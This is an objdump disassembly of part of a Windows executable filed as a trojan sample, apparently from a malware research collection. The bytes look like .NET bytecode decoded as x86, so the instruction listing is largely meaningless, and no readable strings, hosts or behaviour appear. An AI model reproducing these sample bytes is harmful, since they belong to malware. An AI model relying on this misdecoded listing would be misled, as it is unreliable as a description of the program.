
malware_samples/trojan/41a485c3bbf7a3f02e0bd79f63aa53db79ff163638ae9e236bd7caea08e06fe4.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	50                   	push   %eax
  402001:	b4 00                	mov    $0x0,%ah
  402003:	00 00                	add    %al,(%eax)
  402005:	00 00                	add    %al,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 7c 9d 00       	add    $0x9d7c00,%eax
  402013:	00 84 16 00 00 03 00 	add    %al,0x30000(%esi,%edx,1)
  40201a:	02 00                	add    (%eax),%al
  40201c:	17                   	pop    %ss
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
	...
  402050:	13 30                	adc    (%eax),%esi
  402052:	08 00                	or     %al,(%eax)
  402054:	88 0f                	mov    %cl,(%edi)
  402056:	00 00                	add    %al,(%eax)
  402058:	01 00                	add    %eax,(%eax)
  40205a:	00 11                	add    %dl,(%ecx)
  40205c:	28 0a                	sub    %cl,(%edx)
  40205e:	00 00                	add    %al,(%eax)
  402060:	06                   	push   %es
  402061:	fe 0d 0c 00 25 20    	decb   0x2025000c
  402067:	01 00                	add    %eax,(%eax)
  402069:	00 00                	add    %al,(%eax)
  40206b:	54                   	push   %esp
  40206c:	46                   	inc    %esi
  40206d:	fe 0e                	decb   (%esi)
  40206f:	0d 00 fe 0c 0d       	or     $0xd0cfe00,%eax
  402074:	00 20                	add    %ah,(%eax)
  402076:	04 00                	add    $0x0,%al
  402078:	00 00                	add    %al,(%eax)
  40207a:	5a                   	pop    %edx
  40207b:	fe 0e                	decb   (%esi)
  40207d:	03 00                	add    (%eax),%eax
  40207f:	fe 0c 0d 00 20 08 00 	decb   0x82000(,%ecx,1)
  402086:	00 00                	add    %al,(%eax)
  402088:	5a                   	pop    %edx
  402089:	fe 0e                	decb   (%esi)
  40208b:	04 00                	add    $0x0,%al
  40208d:	20 05 00 00 00 8d    	and    %al,0x8d000000
  402093:	02 00                	add    (%eax),%al
  402095:	00 01                	add    %al,(%ecx)
  402097:	fe 0e                	decb   (%esi)
  402099:	0e                   	push   %cs
  40209a:	00 20                	add    %ah,(%eax)
  40209c:	05 00 00 00 8d       	add    $0x8d000000,%eax
  4020a1:	03 00                	add    (%eax),%eax
  4020a3:	00 01                	add    %al,(%ecx)
  4020a5:	fe 0e                	decb   (%esi)
  4020a7:	08 00                	or     %al,(%eax)
  4020a9:	20 05 00 00 00 8d    	and    %al,0x8d000000
  4020af:	04 00                	add    $0x0,%al
  4020b1:	00 01                	add    %al,(%ecx)
  4020b3:	fe 0e                	decb   (%esi)
  4020b5:	00 00                	add    %al,(%eax)
  4020b7:	20 05 00 00 00 8d    	and    %al,0x8d000000
  4020bd:	05 00 00 01 25       	add    $0x25010000,%eax
  4020c2:	fe 0e                	decb   (%esi)
  4020c4:	07                   	pop    %es
  4020c5:	00 fe                	add    %bh,%dh
  4020c7:	0e                   	push   %cs
  4020c8:	05 00 20 08 00       	add    $0x82000,%eax
  4020cd:	00 00                	add    %al,(%eax)
  4020cf:	8d 03                	lea    (%ebx),%eax
  4020d1:	00 00                	add    %al,(%eax)
  4020d3:	01 fe                	add    %edi,%esi
  4020d5:	0e                   	push   %cs
  4020d6:	02 00                	add    (%eax),%al
  4020d8:	fe 0c 02             	decb   (%edx,%eax,1)
  4020db:	00 20                	add    %ah,(%eax)
  4020dd:	03 00                	add    (%eax),%eax
  4020df:	00 00                	add    %al,(%eax)
  4020e1:	7e 02                	jle    0x4020e5
  4020e3:	00 00                	add    %al,(%eax)
  4020e5:	04 8c                	add    $0x8c,%al
  4020e7:	01 00                	add    %eax,(%eax)
  4020e9:	00 01                	add    %al,(%ecx)
  4020eb:	a2 7f 07 00 00       	mov    %al,0x77f
  4020f0:	04 fe                	add    $0xfe,%al
  4020f2:	0e                   	push   %cs
  4020f3:	06                   	push   %es
  4020f4:	00 fe                	add    %bh,%dh
  4020f6:	0c 06                	or     $0x6,%al
  4020f8:	00 fe                	add    %bh,%dh
  4020fa:	0e                   	push   %cs
  4020fb:	01 00                	add    %eax,(%eax)
  4020fd:	fe 0c 01             	decb   (%ecx,%eax,1)
  402100:	00 fe                	add    %bh,%dh
  402102:	0e                   	push   %cs
  402103:	0a 00                	or     (%eax),%al
  402105:	00 fe                	add    %bh,%dh
  402107:	0c 0f                	or     $0xf,%al
  402109:	00 20                	add    %ah,(%eax)
  40210b:	01 00                	add    %eax,(%eax)
  40210d:	00 00                	add    %al,(%eax)
  40210f:	40                   	inc    %eax
  402110:	05 00 00 00 38       	add    $0x38000000,%eax
  402115:	c9                   	leave
  402116:	0e                   	push   %cs
  402117:	00 00                	add    %al,(%eax)
  402119:	00 fe                	add    %bh,%dh
  40211b:	0c 01                	or     $0x1,%al
  40211d:	00 fe                	add    %bh,%dh
  40211f:	0e                   	push   %cs
  402120:	0a 00                	or     (%eax),%al
  402122:	fe 0c 01             	decb   (%ecx,%eax,1)
  402125:	00 46 fe             	add    %al,-0x2(%esi)
  402128:	0e                   	push   %cs
  402129:	0b 00                	or     (%eax),%eax
  40212b:	fe 0c 01             	decb   (%ecx,%eax,1)
  40212e:	00 20                	add    %ah,(%eax)
  402130:	01 00                	add    %eax,(%eax)
  402132:	00 00                	add    %al,(%eax)
  402134:	58                   	pop    %eax
  402135:	fe 0e                	decb   (%esi)
  402137:	01 00                	add    %eax,(%eax)
  402139:	fe 0c 0b             	decb   (%ebx,%ecx,1)
  40213c:	00 20                	add    %ah,(%eax)
  40213e:	01 00                	add    %eax,(%eax)
  402140:	00 00                	add    %al,(%eax)
  402142:	3f                   	aas
  402143:	d3 04 00             	roll   %cl,(%eax,%eax,1)
  402146:	00 fe                	add    %bh,%dh
  402148:	0c 0b                	or     $0xb,%al
  40214a:	00 20                	add    %ah,(%eax)
  40214c:	20 00                	and    %al,(%eax)
  40214e:	00 00                	add    %al,(%eax)
  402150:	3d c5 04 00 00       	cmp    $0x4c5,%eax
  402155:	20 10                	and    %dl,(%eax)
  402157:	00 00                	add    %al,(%eax)
  402159:	00 fe                	add    %bh,%dh
  40215b:	0c 0b                	or     $0xb,%al
  40215d:	00 3f                	add    %bh,(%edi)
  40215f:	52                   	push   %edx
  402160:	02 00                	add    (%eax),%al
  402162:	00 20                	add    %ah,(%eax)
  402164:	10 00                	adc    %al,(%eax)
  402166:	00 00                	add    %al,(%eax)
  402168:	fe 0c 0b             	decb   (%ebx,%ecx,1)
  40216b:	00 3d 05 00 00 00    	add    %bh,0x5
  402171:	38 81 09 00 00 20    	cmp    %al,0x20000009(%ecx)
  402177:	08 00                	or     %al,(%eax)
  402179:	00 00                	add    %al,(%eax)
  40217b:	fe 0c 0b             	decb   (%ebx,%ecx,1)
  40217e:	00 3f                	add    %bh,(%edi)
  402180:	22 01                	and    (%ecx),%al
  402182:	00 00                	add    %al,(%eax)
  402184:	20 08                	and    %cl,(%eax)
  402186:	00 00                	add    %al,(%eax)
  402188:	00 fe                	add    %bh,%dh
  40218a:	0c 0b                	or     $0xb,%al
  40218c:	00 3d 05 00 00 00    	add    %bh,0x5
  402192:	38 5d 06             	cmp    %bl,0x6(%ebp)
  402195:	00 00                	add    %al,(%eax)
  402197:	20 04 00             	and    %al,(%eax,%eax,1)
  40219a:	00 00                	add    %al,(%eax)
  40219c:	fe 0c 0b             	decb   (%ebx,%ecx,1)
  40219f:	00 3f                	add    %bh,(%edi)
  4021a1:	8a 00                	mov    (%eax),%al
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	20 04 00             	and    %al,(%eax,%eax,1)
  4021a8:	00 00                	add    %al,(%eax)
  4021aa:	fe 0c 0b             	decb   (%ebx,%ecx,1)
  4021ad:	00 3d 05 00 00 00    	add    %bh,0x5
  4021b3:	38 2c 05 00 00 20 02 	cmp    %ch,0x2200000(,%eax,1)
  4021ba:	00 00                	add    %al,(%eax)
  4021bc:	00 fe                	add    %bh,%dh
  4021be:	0c 0b                	or     $0xb,%al
  4021c0:	00 3f                	add    %bh,(%edi)
  4021c2:	3e 00 00             	add    %al,%ds:(%eax)
  4021c5:	00 20                	add    %ah,(%eax)
  4021c7:	02 00                	add    (%eax),%al
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	fe 0c 0b             	decb   (%ebx,%ecx,1)
  4021ce:	00 3d 05 00 00 00    	add    %bh,0x5
  4021d4:	38 8a 04 00 00 20    	cmp    %cl,0x20000004(%edx)
  4021da:	01 00                	add    %eax,(%eax)
  4021dc:	00 00                	add    %al,(%eax)
  4021de:	fe 0c 0b             	decb   (%ebx,%ecx,1)
  4021e1:	00 3f                	add    %bh,(%edi)
  4021e3:	18 00                	sbb    %al,(%eax)
  4021e5:	00 00                	add    %al,(%eax)
  4021e7:	20 01                	and    %al,(%ecx)
  4021e9:	00 00                	add    %al,(%eax)
  4021eb:	00 fe                	add    %bh,%dh
  4021ed:	0c 0b                	or     $0xb,%al
  4021ef:	00 3d 05 00 00 00    	add    %bh,0x5
  4021f5:	38 21                	cmp    %ah,(%ecx)
  4021f7:	04 00                	add    $0x0,%al
  4021f9:	00 38                	add    %bh,(%eax)
  4021fb:	1b 04 00             	sbb    (%eax,%eax,1),%eax
  4021fe:	00 38                	add    %bh,(%eax)
  402200:	16                   	push   %ss
  402201:	04 00                	add    $0x0,%al
  402203:	00 20                	add    %ah,(%eax)
  402205:	03 00                	add    (%eax),%eax
  402207:	00 00                	add    %al,(%eax)
  402209:	fe 0c 0b             	decb   (%ebx,%ecx,1)
  40220c:	00 3f                	add    %bh,(%edi)
  40220e:	18 00                	sbb    %al,(%eax)
  402210:	00 00                	add    %al,(%eax)
  402212:	20 03                	and    %al,(%ebx)
  402214:	00 00                	add    %al,(%eax)
  402216:	00 fe                	add    %bh,%dh
  402218:	0c 0b                	or     $0xb,%al
  40221a:	00 3d 05 00 00 00    	add    %bh,0x5
  402220:	38 80 04 00 00 38    	cmp    %al,0x38000004(%eax)
  402226:	f0 03 00             	lock add (%eax),%eax
  402229:	00 38                	add    %bh,(%eax)
  40222b:	eb 03                	jmp    0x402230
  40222d:	00 00                	add    %al,(%eax)
  40222f:	20 06                	and    %al,(%esi)
  402231:	00 00                	add    %al,(%eax)
  402233:	00 fe                	add    %bh,%dh
  402235:	0c 0b                	or     $0xb,%al
  402237:	00 3f                	add    %bh,(%edi)
  402239:	3e 00 00             	add    %al,%ds:(%eax)
  40223c:	00 20                	add    %ah,(%eax)
  40223e:	06                   	push   %es
  40223f:	00 00                	add    %al,(%eax)
  402241:	00 fe                	add    %bh,%dh
  402243:	0c 0b                	or     $0xb,%al
  402245:	00 3d 05 00 00 00    	add    %bh,0x5
  40224b:	38 09                	cmp    %cl,(%ecx)
  40224d:	05 00 00 20 05       	add    $0x5200000,%eax
  402252:	00 00                	add    %al,(%eax)
  402254:	00 fe                	add    %bh,%dh
  402256:	0c 0b                	or     $0xb,%al
  402258:	00 3f                	add    %bh,(%edi)
  40225a:	18 00                	sbb    %al,(%eax)
  40225c:	00 00                	add    %al,(%eax)
  40225e:	20 05 00 00 00 fe    	and    %al,0xfe000000
  402264:	0c 0b                	or     $0xb,%al
  402266:	00 3d 05 00 00 00    	add    %bh,0x5
  40226c:	38 a0 04 00 00 38    	cmp    %ah,0x38000004(%eax)
  402272:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402273:	03 00                	add    (%eax),%eax
  402275:	00 38                	add    %bh,(%eax)
  402277:	9f                   	lahf
  402278:	03 00                	add    (%eax),%eax
  40227a:	00 20                	add    %ah,(%eax)
  40227c:	07                   	pop    %es
  40227d:	00 00                	add    %al,(%eax)
  40227f:	00 fe                	add    %bh,%dh
  402281:	0c 0b                	or     $0xb,%al
  402283:	00 3f                	add    %bh,(%edi)
  402285:	18 00                	sbb    %al,(%eax)
  402287:	00 00                	add    %al,(%eax)
  402289:	20 07                	and    %al,(%edi)
  40228b:	00 00                	add    %al,(%eax)
  40228d:	00 fe                	add    %bh,%dh
  40228f:	0c 0b                	or     $0xb,%al
  402291:	00 3d 05 00 00 00    	add    %bh,0x5
  402297:	38 0f                	cmp    %cl,(%edi)
  402299:	05 00 00 38 79       	add    $0x79380000,%eax
  40229e:	03 00                	add    (%eax),%eax
  4022a0:	00 38                	add    %bh,(%eax)
  4022a2:	74 03                	je     0x4022a7
  4022a4:	00 00                	add    %al,(%eax)
  4022a6:	20 0c 00             	and    %cl,(%eax,%eax,1)
  4022a9:	00 00                	add    %al,(%eax)
  4022ab:	fe 0c 0b             	decb   (%ebx,%ecx,1)
  4022ae:	00 3f                	add    %bh,(%edi)
  4022b0:	8a 00                	mov    (%eax),%al
  4022b2:	00 00                	add    %al,(%eax)
  4022b4:	20 0c 00             	and    %cl,(%eax,%eax,1)
  4022b7:	00 00                	add    %al,(%eax)
  4022b9:	fe 0c 0b             	decb   (%ebx,%ecx,1)
  4022bc:	00 3d 05 00 00 00    	add    %bh,0x5
  4022c2:	38 de                	cmp    %bl,%dh
  4022c4:	06                   	push   %es
  4022c5:	00 00                	add    %al,(%eax)
  4022c7:	20 0a                	and    %cl,(%edx)
  4022c9:	00 00                	add    %al,(%eax)
  4022cb:	00 fe                	add    %bh,%dh
  4022cd:	0c 0b                	or     $0xb,%al
  4022cf:	00 3f                	add    %bh,(%edi)
  4022d1:	3e 00 00             	add    %al,%ds:(%eax)
  4022d4:	00 20                	add    %ah,(%eax)
  4022d6:	0a 00                	or     (%eax),%al
  4022d8:	00 00                	add    %al,(%eax)
  4022da:	fe 0c 0b             	decb   (%ebx,%ecx,1)
  4022dd:	00 3d 05 00 00 00    	add    %bh,0x5
  4022e3:	38 06                	cmp    %al,(%esi)
  4022e5:	06                   	push   %es
  4022e6:	00 00                	add    %al,(%eax)
  4022e8:	20 09                	and    %cl,(%ecx)
  4022ea:	00 00                	add    %al,(%eax)
  4022ec:	00 fe                	add    %bh,%dh
  4022ee:	0c 0b                	or     $0xb,%al
  4022f0:	00 3f                	add    %bh,(%edi)
  4022f2:	18 00                	sbb    %al,(%eax)
  4022f4:	00 00                	add    %al,(%eax)
  4022f6:	20 09                	and    %cl,(%ecx)
  4022f8:	00 00                	add    %al,(%eax)
  4022fa:	00 fe                	add    %bh,%dh
  4022fc:	0c 0b                	or     $0xb,%al
  4022fe:	00 3d 05 00 00 00    	add    %bh,0x5
  402304:	38 52 05             	cmp    %dl,0x5(%edx)
  402307:	00 00                	add    %al,(%eax)
  402309:	38 0c 03             	cmp    %cl,(%ebx,%eax,1)
  40230c:	00 00                	add    %al,(%eax)
  40230e:	38 07                	cmp    %al,(%edi)
  402310:	03 00                	add    (%eax),%eax
  402312:	00 20                	add    %ah,(%eax)
  402314:	0b 00                	or     (%eax),%eax
  402316:	00 00                	add    %al,(%eax)
  402318:	fe 0c 0b             	decb   (%ebx,%ecx,1)
  40231b:	00 3f                	add    %bh,(%edi)
  40231d:	18 00                	sbb    %al,(%eax)
  40231f:	00 00                	add    %al,(%eax)
  402321:	20 0b                	and    %cl,(%ebx)
  402323:	00 00                	add    %al,(%eax)
  402325:	00 fe                	add    %bh,%dh
  402327:	0c 0b                	or     $0xb,%al
  402329:	00 3d 05 00 00 00    	add    %bh,0x5
  40232f:	38 2f                	cmp    %ch,(%edi)
  402331:	06                   	push   %es
  402332:	00 00                	add    %al,(%eax)
  402334:	38 e1                	cmp    %ah,%cl
  402336:	02 00                	add    (%eax),%al
  402338:	00 38                	add    %bh,(%eax)
  40233a:	dc 02                	faddl  (%edx)
  40233c:	00 00                	add    %al,(%eax)
  40233e:	20 0e                	and    %cl,(%esi)
  402340:	00 00                	add    %al,(%eax)
  402342:	00 fe                	add    %bh,%dh
  402344:	0c 0b                	or     $0xb,%al
  402346:	00 3f                	add    %bh,(%edi)
  402348:	3e 00 00             	add    %al,%ds:(%eax)
  40234b:	00 20                	add    %ah,(%eax)
  40234d:	0e                   	push   %cs
  40234e:	00 00                	add    %al,(%eax)
  402350:	00 fe                	add    %bh,%dh
  402352:	0c 0b                	or     $0xb,%al
  402354:	00 3d 05 00 00 00    	add    %bh,0x5
  40235a:	38 0a                	cmp    %cl,(%edx)
  40235c:	07                   	pop    %es
  40235d:	00 00                	add    %al,(%eax)
  40235f:	20 0d 00 00 00 fe    	and    %cl,0xfe000000
  402365:	0c 0b                	or     $0xb,%al
  402367:	00 3f                	add    %bh,(%edi)
  402369:	18 00                	sbb    %al,(%eax)
  40236b:	00 00                	add    %al,(%eax)
  40236d:	20 0d 00 00 00 fe    	and    %cl,0xfe000000
  402373:	0c 0b                	or     $0xb,%al
  402375:	00 3d 05 00 00 00    	add    %bh,0x5
  40237b:	38 aa 06 00 00 38    	cmp    %ch,0x38000006(%edx)
  402381:	95                   	xchg   %eax,%ebp
  402382:	02 00                	add    (%eax),%al
  402384:	00 38                	add    %bh,(%eax)
  402386:	90                   	nop
  402387:	02 00                	add    (%eax),%al
  402389:	00 20                	add    %ah,(%eax)
  40238b:	0f 00 00             	sldt   (%eax)
  40238e:	00 fe                	add    %bh,%dh
  402390:	0c 0b                	or     $0xb,%al
  402392:	00 3f                	add    %bh,(%edi)
  402394:	18 00                	sbb    %al,(%eax)
  402396:	00 00                	add    %al,(%eax)
  402398:	20 0f                	and    %cl,(%edi)
  40239a:	00 00                	add    %al,(%eax)
  40239c:	00 fe                	add    %bh,%dh
  40239e:	0c 0b                	or     $0xb,%al
  4023a0:	00 3d 05 00 00 00    	add    %bh,0x5
  4023a6:	38 05 07 00 00 38    	cmp    %al,0x38000007
  4023ac:	6a 02                	push   $0x2
  4023ae:	00 00                	add    %al,(%eax)
  4023b0:	38 65 02             	cmp    %ah,0x2(%ebp)
  4023b3:	00 00                	add    %al,(%eax)
  4023b5:	20 18                	and    %bl,(%eax)
  4023b7:	00 00                	add    %al,(%eax)
  4023b9:	00 fe                	add    %bh,%dh
  4023bb:	0c 0b                	or     $0xb,%al
  4023bd:	00 3f                	add    %bh,(%edi)
  4023bf:	22 01                	and    (%ecx),%al
  4023c1:	00 00                	add    %al,(%eax)
  4023c3:	20 18                	and    %bl,(%eax)
  4023c5:	00 00                	add    %al,(%eax)
  4023c7:	00 fe                	add    %bh,%dh
  4023c9:	0c 0b                	or     $0xb,%al
  4023cb:	00 3d 05 00 00 00    	add    %bh,0x5
  4023d1:	38 df                	cmp    %bl,%bh
  4023d3:	09 00                	or     %eax,(%eax)
  4023d5:	00 20                	add    %ah,(%eax)
  4023d7:	14 00                	adc    $0x0,%al
  4023d9:	00 00                	add    %al,(%eax)
  4023db:	fe 0c 0b             	decb   (%ebx,%ecx,1)
  4023de:	00 3f                	add    %bh,(%edi)
  4023e0:	8a 00                	mov    (%eax),%al
  4023e2:	00 00                	add    %al,(%eax)
  4023e4:	20 14 00             	and    %dl,(%eax,%eax,1)
  4023e7:	00 00                	add    %al,(%eax)
  4023e9:	fe 0c 0b             	decb   (%ebx,%ecx,1)
  4023ec:	00 3d 05 00 00 00    	add    %bh,0x5
  4023f2:	38 60 08             	cmp    %ah,0x8(%eax)
  4023f5:	00 00                	add    %al,(%eax)
  4023f7:	20 12                	and    %dl,(%edx)
  4023f9:	00 00                	add    %al,(%eax)
  4023fb:	00 fe                	add    %bh,%dh
  4023fd:	0c 0b                	or     $0xb,%al
  4023ff:	00 3f                	add    %bh,(%edi)
  402401:	3e 00 00             	add    %al,%ds:(%eax)
  402404:	00 20                	add    %ah,(%eax)
  402406:	12 00                	adc    (%eax),%al
  402408:	00 00                	add    %al,(%eax)
  40240a:	fe 0c 0b             	decb   (%ebx,%ecx,1)
  40240d:	00 3d 05 00 00 00    	add    %bh,0x5
  402413:	38 8b 07 00 00 20    	cmp    %cl,0x20000007(%ebx)
  402419:	11 00                	adc    %eax,(%eax)
  40241b:	00 00                	add    %al,(%eax)
  40241d:	fe 0c 0b             	decb   (%ebx,%ecx,1)
  402420:	00 3f                	add    %bh,(%edi)
  402422:	18 00                	sbb    %al,(%eax)
  402424:	00 00                	add    %al,(%eax)
  402426:	20 11                	and    %dl,(%ecx)
  402428:	00 00                	add    %al,(%eax)
  40242a:	00 fe                	add    %bh,%dh
  40242c:	0c 0b                	or     $0xb,%al
  40242e:	00 3d 05 00 00 00    	add    %bh,0x5
  402434:	38 0a                	cmp    %cl,(%edx)
  402436:	07                   	pop    %es
  402437:	00 00                	add    %al,(%eax)
  402439:	38 dc                	cmp    %bl,%ah
  40243b:	01 00                	add    %eax,(%eax)
  40243d:	00 38                	add    %bh,(%eax)
  40243f:	d7                   	xlat   %ds:(%ebx)
  402440:	01 00                	add    %eax,(%eax)
  402442:	00 20                	add    %ah,(%eax)
  402444:	13 00                	adc    (%eax),%eax
  402446:	00 00                	add    %al,(%eax)
  402448:	fe 0c 0b             	decb   (%ebx,%ecx,1)
  40244b:	00 3f                	add    %bh,(%edi)
  40244d:	18 00                	sbb    %al,(%eax)
  40244f:	00 00                	add    %al,(%eax)
  402451:	20 13                	and    %dl,(%ebx)
  402453:	00 00                	add    %al,(%eax)
  402455:	00 fe                	add    %bh,%dh
  402457:	0c 0b                	or     $0xb,%al
  402459:	00 3d 05 00 00 00    	add    %bh,0x5
  40245f:	38 a6 07 00 00 38    	cmp    %ah,0x38000007(%esi)
  402465:	b1 01                	mov    $0x1,%cl
  402467:	00 00                	add    %al,(%eax)
  402469:	38 ac 01 00 00 20 16 	cmp    %ch,0x16200000(%ecx,%eax,1)
  402470:	00 00                	add    %al,(%eax)
  402472:	00 fe                	add    %bh,%dh
  402474:	0c 0b                	or     $0xb,%al
  402476:	00 3f                	add    %bh,(%edi)
  402478:	3e 00 00             	add    %al,%ds:(%eax)
  40247b:	00 20                	add    %ah,(%eax)
  40247d:	16                   	push   %ss
  40247e:	00 00                	add    %al,(%eax)
  402480:	00 fe                	add    %bh,%dh
  402482:	0c 0b                	or     $0xb,%al
  402484:	00 3d 05 00 00 00    	add    %bh,0x5
  40248a:	38 7b 08             	cmp    %bh,0x8(%ebx)
  40248d:	00 00                	add    %al,(%eax)
  40248f:	20 15 00 00 00 fe    	and    %dl,0xfe000000
  402495:	0c 0b                	or     $0xb,%al
  402497:	00 3f                	add    %bh,(%edi)
  402499:	18 00                	sbb    %al,(%eax)
  40249b:	00 00                	add    %al,(%eax)
  40249d:	20 15 00 00 00 fe    	and    %dl,0xfe000000
  4024a3:	0c 0b                	or     $0xb,%al
  4024a5:	00 3d 05 00 00 00    	add    %bh,0x5
  4024ab:	38 e9                	cmp    %ch,%cl
  4024ad:	07                   	pop    %es
  4024ae:	00 00                	add    %al,(%eax)
  4024b0:	38 65 01             	cmp    %ah,0x1(%ebp)
  4024b3:	00 00                	add    %al,(%eax)
  4024b5:	38 60 01             	cmp    %ah,0x1(%eax)
  4024b8:	00 00                	add    %al,(%eax)
  4024ba:	20 17                	and    %dl,(%edi)
  4024bc:	00 00                	add    %al,(%eax)
  4024be:	00 fe                	add    %bh,%dh
  4024c0:	0c 0b                	or     $0xb,%al
  4024c2:	00 3f                	add    %bh,(%edi)
  4024c4:	18 00                	sbb    %al,(%eax)
  4024c6:	00 00                	add    %al,(%eax)
  4024c8:	20 17                	and    %dl,(%edi)
  4024ca:	00 00                	add    %al,(%eax)
  4024cc:	00 fe                	add    %bh,%dh
  4024ce:	0c 0b                	or     $0xb,%al
  4024d0:	00 3d 05 00 00 00    	add    %bh,0x5
  4024d6:	38 96 08 00 00 38    	cmp    %dl,0x38000008(%esi)
  4024dc:	3a 01                	cmp    (%ecx),%al
  4024de:	00 00                	add    %al,(%eax)
  4024e0:	38 35 01 00 00 20    	cmp    %dh,0x20000001
  4024e6:	1c 00                	sbb    $0x0,%al
  4024e8:	00 00                	add    %al,(%eax)
  4024ea:	fe 0c 0b             	decb   (%ebx,%ecx,1)
  4024ed:	00 3f                	add    %bh,(%edi)
  4024ef:	8a 00                	mov    (%eax),%al
  4024f1:	00 00                	add    %al,(%eax)
  4024f3:	20 1c 00             	and    %bl,(%eax,%eax,1)
  4024f6:	00 00                	add    %al,(%eax)
  4024f8:	fe 0c 0b             	decb   (%ebx,%ecx,1)
  4024fb:	00 3d 05 00 00 00    	add    %bh,0x5
  402501:	38 de                	cmp    %bl,%dh
  402503:	09 00                	or     %eax,(%eax)
  402505:	00 20                	add    %ah,(%eax)
  402507:	1a 00                	sbb    (%eax),%al
  402509:	00 00                	add    %al,(%eax)
  40250b:	fe 0c 0b             	decb   (%ebx,%ecx,1)
  40250e:	00 3f                	add    %bh,(%edi)
  402510:	3e 00 00             	add    %al,%ds:(%eax)
  402513:	00 20                	add    %ah,(%eax)
  402515:	1a 00                	sbb    (%eax),%al
  402517:	00 00                	add    %al,(%eax)
  402519:	fe 0c 0b             	decb   (%ebx,%ecx,1)
  40251c:	00 3d 05 00 00 00    	add    %bh,0x5
  402522:	38 31                	cmp    %dh,(%ecx)
  402524:	09 00                	or     %eax,(%eax)
  402526:	00 20                	add    %ah,(%eax)
  402528:	19 00                	sbb    %eax,(%eax)
  40252a:	00 00                	add    %al,(%eax)
  40252c:	fe 0c 0b             	decb   (%ebx,%ecx,1)
  40252f:	00 3f                	add    %bh,(%edi)
  402531:	18 00                	sbb    %al,(%eax)
  402533:	00 00                	add    %al,(%eax)
  402535:	20 19                	and    %bl,(%ecx)
  402537:	00 00                	add    %al,(%eax)
  402539:	00 fe                	add    %bh,%dh
  40253b:	0c 0b                	or     $0xb,%al
  40253d:	00 3d 05 00 00 00    	add    %bh,0x5
  402543:	38 b1 08 00 00 38    	cmp    %dh,0x38000008(%ecx)
  402549:	cd 00                	int    $0x0
  40254b:	00 00                	add    %al,(%eax)
  40254d:	38 c8                	cmp    %cl,%al
  40254f:	00 00                	add    %al,(%eax)
  402551:	00 20                	add    %ah,(%eax)
  402553:	1b 00                	sbb    (%eax),%eax
  402555:	00 00                	add    %al,(%eax)
  402557:	fe 0c 0b             	decb   (%ebx,%ecx,1)
  40255a:	00 3f                	add    %bh,(%edi)
  40255c:	18 00                	sbb    %al,(%eax)
  40255e:	00 00                	add    %al,(%eax)
  402560:	20 1b                	and    %bl,(%ebx)
  402562:	00 00                	add    %al,(%eax)
  402564:	00 fe                	add    %bh,%dh
  402566:	0c 0b                	or     $0xb,%al
  402568:	00 3d 05 00 00 00    	add    %bh,0x5
  40256e:	38 2f                	cmp    %ch,(%edi)
  402570:	09 00                	or     %eax,(%eax)
  402572:	00 38                	add    %bh,(%eax)
  402574:	a2 00 00 00 38       	mov    %al,0x38000000
  402579:	9d                   	popf
  40257a:	00 00                	add    %al,(%eax)
  40257c:	00 20                	add    %ah,(%eax)
  40257e:	1e                   	push   %ds
  40257f:	00 00                	add    %al,(%eax)
  402581:	00 fe                	add    %bh,%dh
  402583:	0c 0b                	or     $0xb,%al
  402585:	00 3f                	add    %bh,(%edi)
  402587:	3e 00 00             	add    %al,%ds:(%eax)
  40258a:	00 20                	add    %ah,(%eax)
  40258c:	1e                   	push   %ds
  40258d:	00 00                	add    %al,(%eax)
  40258f:	00 fe                	add    %bh,%dh
  402591:	0c 0b                	or     $0xb,%al
  402593:	00 3d 05 00 00 00    	add    %bh,0x5
  402599:	38 16                	cmp    %dl,(%esi)
  40259b:	0a 00                	or     (%eax),%al
  40259d:	00 20                	add    %ah,(%eax)
  40259f:	1d 00 00 00 fe       	sbb    $0xfe000000,%eax
  4025a4:	0c 0b                	or     $0xb,%al
  4025a6:	00 3f                	add    %bh,(%edi)
  4025a8:	18 00                	sbb    %al,(%eax)
  4025aa:	00 00                	add    %al,(%eax)
  4025ac:	20 1d 00 00 00 fe    	and    %bl,0xfe000000
  4025b2:	0c 0b                	or     $0xb,%al
  4025b4:	00 3d 05 00 00 00    	add    %bh,0x5
  4025ba:	38 96 09 00 00 38    	cmp    %dl,0x38000009(%esi)
  4025c0:	56                   	push   %esi
  4025c1:	00 00                	add    %al,(%eax)
  4025c3:	00 38                	add    %bh,(%eax)
  4025c5:	51                   	push   %ecx
  4025c6:	00 00                	add    %al,(%eax)
  4025c8:	00 20                	add    %ah,(%eax)
  4025ca:	1f                   	pop    %ds
  4025cb:	00 00                	add    %al,(%eax)
  4025cd:	00 fe                	add    %bh,%dh
  4025cf:	0c 0b                	or     $0xb,%al
  4025d1:	00 3f                	add    %bh,(%edi)
  4025d3:	18 00                	sbb    %al,(%eax)
  4025d5:	00 00                	add    %al,(%eax)
  4025d7:	20 1f                	and    %bl,(%edi)
  4025d9:	00 00                	add    %al,(%eax)
  4025db:	00 fe                	add    %bh,%dh
  4025dd:	0c 0b                	or     $0xb,%al
  4025df:	00 3d 05 00 00 00    	add    %bh,0x5
  4025e5:	38 e4                	cmp    %ah,%ah
  4025e7:	09 00                	or     %eax,(%eax)
  4025e9:	00 38                	add    %bh,(%eax)
  4025eb:	2b 00                	sub    (%eax),%eax
  4025ed:	00 00                	add    %al,(%eax)
  4025ef:	20 20                	and    %ah,(%eax)
  4025f1:	00 00                	add    %al,(%eax)
  4025f3:	00 fe                	add    %bh,%dh
  4025f5:	0c 0b                	or     $0xb,%al
  4025f7:	00 3f                	add    %bh,(%edi)
  4025f9:	18 00                	sbb    %al,(%eax)
  4025fb:	00 00                	add    %al,(%eax)
  4025fd:	20 20                	and    %ah,(%eax)
  4025ff:	00 00                	add    %al,(%eax)
  402601:	00 fe                	add    %bh,%dh
  402603:	0c 0b                	or     $0xb,%al
  402605:	00 3d 05 00 00 00    	add    %bh,0x5
  40260b:	38 c4                	cmp    %al,%ah
  40260d:	09 00                	or     %eax,(%eax)
  40260f:	00 38                	add    %bh,(%eax)
  402611:	05 00 00 00 38       	add    $0x38000000,%eax
  402616:	00 00                	add    %al,(%eax)
  402618:	00 00                	add    %al,(%eax)
  40261a:	00 fe                	add    %bh,%dh
  40261c:	0c 05                	or     $0x5,%al
